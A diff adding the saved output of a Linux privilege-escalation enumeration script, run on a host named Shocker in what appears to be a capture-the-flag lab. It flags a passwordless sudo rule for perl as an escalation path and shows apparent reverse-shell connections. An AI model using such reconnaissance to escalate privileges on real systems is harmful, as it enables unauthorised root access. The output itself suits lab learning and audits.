@@ -1,0 +1,959 @@
+
+[00;31m#########################################################[00m
+[00;31m#[00m [00;33mLocal Linux Enumeration & Privilege Escalation Script[00m [00;31m#[00m
+[00;31m#########################################################[00m
+[00;33m# www.rebootuser.com[00m
+[00;33m# [00m
+
+Debug Info
+thorough tests = disabled
+
+
+[00;33mScan started at:
+Sat Dec 23 15:01:51 EST 2017
+[00m
+
+[00;33m### SYSTEM ##############################################[00m
+[00;31mKernel information:[00m
+Linux Shocker 4.4.0-96-generic #119-Ubuntu SMP Tue Sep 12 14:59:54 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+
+
+[00;31mKernel information (continued):[00m
+Linux version 4.4.0-96-generic (buildd@lgw01-10) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #119-Ubuntu SMP Tue Sep 12 14:59:54 UTC 2017
+
+
+[00;31mSpecific release information:[00m
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=16.04
+DISTRIB_CODENAME=xenial
+DISTRIB_DESCRIPTION="Ubuntu 16.04.3 LTS"
+NAME="Ubuntu"
+VERSION="16.04.3 LTS (Xenial Xerus)"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 16.04.3 LTS"
+VERSION_ID="16.04"
+HOME_URL="http://www.ubuntu.com/"
+SUPPORT_URL="http://help.ubuntu.com/"
+BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
+VERSION_CODENAME=xenial
+UBUNTU_CODENAME=xenial
+
+
+[00;31mHostname:[00m
+Shocker
+
+
+[00;33m### USER/GROUP ##########################################[00m
+[00;31mCurrent user/group info:[00m
+uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
+
+
+[00;31mUsers that have previously logged onto the system:[00m
+Username         Port     From             Latest
+root             pts/1    10.10.14.2       Mon Sep 25 08:28:44 -0400 2017
+shelly           tty1                      Fri Sep 22 15:52:14 -0400 2017
+
+
+[00;31mAll users and uid/gid info:[00m
+root:x:0:0
+daemon:x:1:1
+bin:x:2:2
+sys:x:3:3
+sync:x:4:65534
+games:x:5:60
+man:x:6:12
+lp:x:7:7
+mail:x:8:8
+news:x:9:9
+uucp:x:10:10
+proxy:x:13:13
+www-data:x:33:33
+backup:x:34:34
+list:x:38:38
+irc:x:39:39
+gnats:x:41:41
+nobody:x:65534:65534
+systemd-timesync:x:100:102
+systemd-network:x:101:103
+systemd-resolve:x:102:104
+systemd-bus-proxy:x:103:105
+syslog:x:104:108
+_apt:x:105:65534
+lxd:x:106:65534
+messagebus:x:107:111
+uuidd:x:108:112
+dnsmasq:x:109:65534
+sshd:x:110:65534
+shelly:x:1000:1000
+
+
+[00;31mGroup memberships:[00m
+uid=0(root) gid=0(root) groups=0(root)
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+uid=2(bin) gid=2(bin) groups=2(bin)
+uid=3(sys) gid=3(sys) groups=3(sys)
+uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
+uid=5(games) gid=60(games) groups=60(games)
+uid=6(man) gid=12(man) groups=12(man)
+uid=7(lp) gid=7(lp) groups=7(lp)
+uid=8(mail) gid=8(mail) groups=8(mail)
+uid=9(news) gid=9(news) groups=9(news)
+uid=10(uucp) gid=10(uucp) groups=10(uucp)
+uid=13(proxy) gid=13(proxy) groups=13(proxy)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=34(backup) gid=34(backup) groups=34(backup)
+uid=38(list) gid=38(list) groups=38(list)
+uid=39(irc) gid=39(irc) groups=39(irc)
+uid=41(gnats) gid=41(gnats) groups=41(gnats)
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
+uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
+uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
+uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
+uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
+uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
+uid=106(lxd) gid=65534(nogroup) groups=65534(nogroup)
+uid=107(messagebus) gid=111(messagebus) groups=111(messagebus)
+uid=108(uuidd) gid=112(uuidd) groups=112(uuidd)
+uid=109(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
+uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
+uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
+
+
+[00;31mSample entires from /etc/passwd (searching for uid values 0, 500, 501, 502, 1000, 1001, 1002, 2000, 2001, 2002):[00m
+root:x:0:0:root:/root:/bin/bash
+shelly:x:1000:1000:shelly,,,:/home/shelly:/bin/bash
+
+
+[00;31mSuper user account(s):[00m
+root
+
+
+[00;33mWe can sudo without supplying a password![00m
+Matching Defaults entries for shelly on Shocker:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User shelly may run the following commands on Shocker:
+    (root) NOPASSWD: /usr/bin/perl
+
+
+[00;33m***Possible Sudo PWNAGE![00m
+-rwxr-xr-x 2 root root 1907192 Mar 13  2016 /usr/bin/perl
+
+
+[00;31mAre permissions on /home directories lax:[00m
+total 12K
+drwxr-xr-x  3 root   root   4.0K Sep 22 12:33 .
+drwxr-xr-x 23 root   root   4.0K Sep 22 12:43 ..
+drwxr-xr-x  4 shelly shelly 4.0K Dec 23 15:01 shelly
+
+
+[00;31mRoot is allowed to login via SSH:[00m
+PermitRootLogin yes
+
+
+[00;33m### ENVIRONMENTAL #######################################[00m
+[00;31mPath information:[00m
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/system/bin:/system/sbin:/system/xbin
+
+
+[00;31mAvailable shells:[00m
+# /etc/shells: valid login shells
+/bin/sh
+/bin/dash
+/bin/bash
+/bin/rbash
+/usr/bin/tmux
+/usr/bin/screen
+
+
+[00;31mCurrent umask value:[00m
+0022
+u=rwx,g=rx,o=rx
+
+
+[00;31mumask value as specified in /etc/login.defs:[00m
+UMASK		022
+
+
+[00;31mPassword and storage information:[00m
+PASS_MAX_DAYS	99999
+PASS_MIN_DAYS	0
+PASS_WARN_AGE	7
+ENCRYPT_METHOD SHA512
+
+
+[00;33m### JOBS/TASKS ##########################################[00m
+[00;31mCron jobs:[00m
+-rw-r--r-- 1 root root  722 Apr  5  2016 /etc/crontab
+
+/etc/cron.d:
+total 20
+drwxr-xr-x  2 root root 4096 Sep 22 12:41 .
+drwxr-xr-x 90 root root 4096 Sep 22 15:55 ..
+-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
+-rw-r--r--  1 root root  589 Jul 16  2014 mdadm
+-rw-r--r--  1 root root  191 Sep 22 12:32 popularity-contest
+
+/etc/cron.daily:
+total 60
+drwxr-xr-x  2 root root 4096 Sep 22 14:11 .
+drwxr-xr-x 90 root root 4096 Sep 22 15:55 ..
+-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
+-rwxr-xr-x  1 root root  539 Apr  5  2016 apache2
+-rwxr-xr-x  1 root root  376 Mar 31  2016 apport
+-rwxr-xr-x  1 root root 1474 Jun 19  2017 apt-compat
+-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils
+-rwxr-xr-x  1 root root 1597 Nov 26  2015 dpkg
+-rwxr-xr-x  1 root root  372 May  6  2015 logrotate
+-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db
+-rwxr-xr-x  1 root root  539 Jul 16  2014 mdadm
+-rwxr-xr-x  1 root root  435 Nov 18  2014 mlocate
+-rwxr-xr-x  1 root root  249 Nov 12  2015 passwd
+-rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest
+-rwxr-xr-x  1 root root  214 May 24  2016 update-notifier-common
+
+/etc/cron.hourly:
+total 12
+drwxr-xr-x  2 root root 4096 Sep 22 12:28 .
+drwxr-xr-x 90 root root 4096 Sep 22 15:55 ..
+-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
+
+/etc/cron.monthly:
+total 12
+drwxr-xr-x  2 root root 4096 Sep 22 12:28 .
+drwxr-xr-x 90 root root 4096 Sep 22 15:55 ..
+-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
+
+/etc/cron.weekly:
+total 24
+drwxr-xr-x  2 root root 4096 Sep 22 12:42 .
+drwxr-xr-x 90 root root 4096 Sep 22 15:55 ..
+-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
+-rwxr-xr-x  1 root root   86 Apr 13  2016 fstrim
+-rwxr-xr-x  1 root root  771 Nov  6  2015 man-db
+-rwxr-xr-x  1 root root  211 May 24  2016 update-notifier-common
+
+
+[00;31mCrontab contents:[00m
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+
+
+[00;33m### NETWORKING  ##########################################[00m
+[00;31mNetwork & IP info:[00m
+ens33     Link encap:Ethernet  HWaddr 00:50:56:aa:de:de  
+          inet addr:10.10.10.56  Bcast:10.10.10.255  Mask:255.255.255.0
+          inet6 addr: dead:beef::250:56ff:feaa:dede/64 Scope:Global
+          inet6 addr: fe80::250:56ff:feaa:dede/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:3429437 errors:0 dropped:10 overruns:0 frame:0
+          TX packets:2344944 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:487106300 (487.1 MB)  TX bytes:494540650 (494.5 MB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:20988 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:20988 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1 
+          RX bytes:1556068 (1.5 MB)  TX bytes:1556068 (1.5 MB)
+
+
+[00;31mDefault route:[00m
+default         10.10.10.2      0.0.0.0         UG    0      0        0 ens33
+
+
+[00;31mListening TCP:[00m
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 0.0.0.0:2222            0.0.0.0:*               LISTEN      -               
+tcp        0      0 10.10.10.56:34232       10.10.14.243:1234       ESTABLISHED 3885/bash       
+tcp        0      0 10.10.10.56:54758       10.10.14.15:1234        ESTABLISHED 1701/bash       
+tcp        0      0 10.10.10.56:43012       10.10.16.124:4444       ESTABLISHED 1932/holbM      
+tcp        0      0 10.10.10.56:58704       10.10.14.101:4444       ESTABLISHED 3260/nOTFn      
+tcp        0      0 10.10.10.56:52054       10.10.15.218:444        ESTABLISHED -               
+tcp        0      0 10.10.10.56:44476       10.10.15.218:443        ESTABLISHED 4439/sh         
+tcp        0      0 10.10.10.56:59808       10.10.14.205:4444       ESTABLISHED 1669/UanRG      
+tcp6       0      0 :::2222                 :::*                    LISTEN      -               
+tcp6       0      0 :::80                   :::*                    LISTEN      -               
+tcp6       0      0 10.10.10.56:80          10.10.15.246:36688      SYN_RECV    -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:55621       TIME_WAIT   -               
+tcp6       0      1 10.10.10.56:80          10.10.15.246:36628      LAST_ACK    -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:40695       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.15.130:43416      TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.217:51559      FIN_WAIT2   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:33191       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.131:38394      TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:55457       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:40897       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:51709       TIME_WAIT   -               
+tcp6       0    453 10.10.10.56:80          10.10.15.246:36654      FIN_WAIT1   -               
+tcp6       0      0 10.10.10.56:80          10.10.15.246:36690      SYN_RECV    -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:59199       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:39723       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.15.130:43414      TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.131:38374      TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.217:51576      FIN_WAIT2   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:37273       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.217:51450      FIN_WAIT2   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:33977       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:46341       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:36957       TIME_WAIT   -               
+tcp6       0      1 10.10.10.56:80          10.10.15.246:36610      LAST_ACK    -               
+tcp6       0    140 10.10.10.56:80          10.10.14.62:41381       ESTABLISHED -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:54905       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:50551       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.217:51546      FIN_WAIT2   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.217:51580      FIN_WAIT2   -               
+tcp6       0      1 10.10.10.56:80          10.10.15.246:36602      LAST_ACK    -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:37899       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:36857       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:41473       TIME_WAIT   -               
+tcp6       0    453 10.10.10.56:80          10.10.15.246:36640      FIN_WAIT1   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.131:38384      TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:37887       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.15.246:36702      SYN_RECV    -               
+tcp6       0    453 10.10.10.56:80          10.10.15.246:36664      FIN_WAIT1   -               
+tcp6       0    140 10.10.10.56:80          10.10.14.62:42227       ESTABLISHED -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:48601       TIME_WAIT   -               
+tcp6       0    140 10.10.10.56:80          10.10.14.62:41321       ESTABLISHED -               
+tcp6       0    140 10.10.10.56:80          10.10.14.62:38835       ESTABLISHED -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:55893       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:38459       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:49569       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.217:51593      FIN_WAIT2   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:59521       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:35353       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:41217       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:33365       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:38749       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.131:38378      TIME_WAIT   -               
+tcp6       0    453 10.10.10.56:80          10.10.15.246:36672      FIN_WAIT1   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:43609       TIME_WAIT   -               
+tcp6       0    140 10.10.10.56:80          10.10.14.62:42843       ESTABLISHED -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:58179       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:40699       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:44223       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:34145       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.15.246:36712      SYN_RECV    -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:49619       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:33575       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:39279       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.15.246:36698      SYN_RECV    -               
+tcp6       0      0 10.10.10.56:80          10.10.15.246:36696      SYN_RECV    -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:47313       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.15.246:36716      SYN_RECV    -               
+tcp6       0    140 10.10.10.56:80          10.10.14.62:46951       ESTABLISHED -               
+tcp6       0      0 10.10.10.56:80          10.10.14.217:51601      FIN_WAIT2   -               
+tcp6       0    140 10.10.10.56:80          10.10.14.62:40157       ESTABLISHED -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:54669       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:33855       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:42281       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.15.246:36700      SYN_RECV    -               
+tcp6       0      0 10.10.10.56:80          10.10.15.246:36714      SYN_RECV    -               
+tcp6       0      1 10.10.10.56:80          10.10.15.246:36614      LAST_ACK    -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:48033       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.15.246:36724      SYN_RECV    -               
+tcp6       0    450 10.10.10.56:80          10.10.15.246:36648      FIN_WAIT1   -               
+tcp6       0    455 10.10.10.56:80          10.10.15.246:36678      FIN_WAIT1   -               
+tcp6       0      0 10.10.10.56:80          10.10.15.246:36708      SYN_RECV    -               
+tcp6       0    453 10.10.10.56:80          10.10.15.246:36660      FIN_WAIT1   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:59393       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:41177       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.15.246:36706      SYN_RECV    -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:45925       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:52901       TIME_WAIT   -               
+tcp6       0    140 10.10.10.56:80          10.10.14.62:51479       ESTABLISHED -               
+tcp6       0      0 10.10.10.56:80          10.10.14.217:51524      FIN_WAIT2   -               
+tcp6       0    454 10.10.10.56:80          10.10.15.246:36668      FIN_WAIT1   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.217:51504      FIN_WAIT2   -               
+tcp6       0    452 10.10.10.56:80          10.10.15.246:36680      FIN_WAIT1   -               
+tcp6       0    160 10.10.10.56:80          10.10.14.62:38367       FIN_WAIT1   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:55507       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:58829       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:57955       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:34347       TIME_WAIT   -               
+tcp6       0      1 10.10.10.56:80          10.10.15.246:36622      LAST_ACK    -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:39897       TIME_WAIT   -               
+tcp6       0    140 10.10.10.56:80          10.10.14.62:39019       ESTABLISHED -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:44773       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.217:51508      FIN_WAIT2   -               
+tcp6       0    450 10.10.10.56:80          10.10.15.246:36538      FIN_WAIT1   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:35617       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:57487       TIME_WAIT   -               
+tcp6       0    449 10.10.10.56:80          10.10.15.246:36638      FIN_WAIT1   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.131:38382      TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:48553       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.217:51563      FIN_WAIT2   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:47187       TIME_WAIT   -               
+tcp6       0    450 10.10.10.56:80          10.10.15.246:36656      FIN_WAIT1   -               
+tcp6       0    453 10.10.10.56:80          10.10.15.130:43418      ESTABLISHED -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:38617       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:59929       TIME_WAIT   -               
+tcp6       0      1 10.10.10.56:80          10.10.15.246:36608      LAST_ACK    -               
+tcp6       0      1 10.10.10.56:80          10.10.15.246:36612      LAST_ACK    -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:56095       TIME_WAIT   -               
+tcp6       0    140 10.10.10.56:80          10.10.14.62:47005       ESTABLISHED -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:43219       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.217:51462      FIN_WAIT2   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:36131       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:45149       SYN_RECV    -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:54423       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.217:51497      FIN_WAIT2   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:42671       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:53569       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:57077       TIME_WAIT   -               
+tcp6       0    140 10.10.10.56:80          10.10.14.62:37907       ESTABLISHED -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:50609       TIME_WAIT   -               
+tcp6       0    450 10.10.10.56:80          10.10.15.246:36670      FIN_WAIT1   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.131:38392      TIME_WAIT   -               
+tcp6       0      1 10.10.10.56:80          10.10.15.246:36606      LAST_ACK    -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:55561       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:50329       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:56873       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:47549       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:40835       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.217:51518      FIN_WAIT2   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:55491       TIME_WAIT   -               
+tcp6       0      1 10.10.10.56:80          10.10.15.246:36600      LAST_ACK    -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:57673       TIME_WAIT   -               
+tcp6       0      1 10.10.10.56:80          10.10.15.246:36492      LAST_ACK    -               
+tcp6       0    449 10.10.10.56:80          10.10.15.246:36644      FIN_WAIT1   -               
+tcp6       0    140 10.10.10.56:80          10.10.14.62:54711       ESTABLISHED -               
+tcp6       0      0 10.10.10.56:80          10.10.15.246:36722      SYN_RECV    -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:39053       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:59163       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:52241       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:48731       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.15.246:36710      SYN_RECV    -               
+tcp6       0      0 10.10.10.56:80          10.10.14.217:51514      FIN_WAIT2   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:53871       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.217:51531      FIN_WAIT2   -               
+tcp6       0      1 10.10.10.56:80          10.10.15.246:36634      LAST_ACK    -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:50623       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:44517       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.217:51443      FIN_WAIT2   -               
+tcp6       0    450 10.10.10.56:80          10.10.15.246:36684      FIN_WAIT1   -               
+tcp6       0    449 10.10.10.56:80          10.10.14.131:38398      ESTABLISHED -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:37685       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.131:38396      TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:34307       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:46587       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:40423       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:52675       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.15.130:43412      TIME_WAIT   -               
+tcp6       0    140 10.10.10.56:80          10.10.14.62:49211       ESTABLISHED -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:51685       TIME_WAIT   -               
+tcp6       1      0 10.10.10.56:80          10.10.15.218:42351      CLOSE_WAIT  -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:59555       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:36521       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.15.246:36704      SYN_RECV    -               
+tcp6       0    140 10.10.10.56:80          10.10.14.62:41383       ESTABLISHED -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:59121       TIME_WAIT   -               
+tcp6       0    140 10.10.10.56:80          10.10.14.62:42745       ESTABLISHED -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:59719       TIME_WAIT   -               
+tcp6       0    453 10.10.10.56:80          10.10.15.246:36662      FIN_WAIT1   -               
+tcp6       0      1 10.10.10.56:80          10.10.15.246:36616      LAST_ACK    -               
+tcp6       0      1 10.10.10.56:80          10.10.15.246:36618      LAST_ACK    -               
+tcp6       0      0 10.10.10.56:80          10.10.14.217:51612      FIN_WAIT2   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:56991       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.15.246:36726      SYN_RECV    -               
+tcp6       0    452 10.10.10.56:80          10.10.15.246:36646      FIN_WAIT1   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:40357       TIME_WAIT   -               
+tcp6       0      1 10.10.10.56:80          10.10.15.246:36632      LAST_ACK    -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:44297       TIME_WAIT   -               
+tcp6       0    140 10.10.10.56:80          10.10.14.62:49169       ESTABLISHED -               
+tcp6       0      0 10.10.10.56:80          10.10.14.131:38372      TIME_WAIT   -               
+tcp6       0    140 10.10.10.56:80          10.10.14.62:59739       ESTABLISHED -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:42923       TIME_WAIT   -               
+tcp6       0      1 10.10.10.56:80          10.10.15.246:36584      LAST_ACK    -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:54507       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.131:38386      TIME_WAIT   -               
+tcp6       0      1 10.10.10.56:80          10.10.15.246:36626      LAST_ACK    -               
+tcp6       0    451 10.10.10.56:80          10.10.15.246:36642      FIN_WAIT1   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:34483       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:39383       TIME_WAIT   -               
+tcp6       0    140 10.10.10.56:80          10.10.14.62:53291       ESTABLISHED -               
+tcp6       0      0 10.10.10.56:80          10.10.14.217:51570      FIN_WAIT2   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:52629       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:56651       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:40497       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.15.246:36720      SYN_RECV    -               
+tcp6       0    140 10.10.10.56:80          10.10.14.62:32971       ESTABLISHED -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:38373       TIME_WAIT   -               
+tcp6       0    140 10.10.10.56:80          10.10.14.62:35055       ESTABLISHED -               
+tcp6       0      0 10.10.10.56:80          10.10.14.62:42167       TIME_WAIT   -               
+tcp6       0      0 10.10.10.56:80          10.10.15.246:36694      SYN_RECV    -               
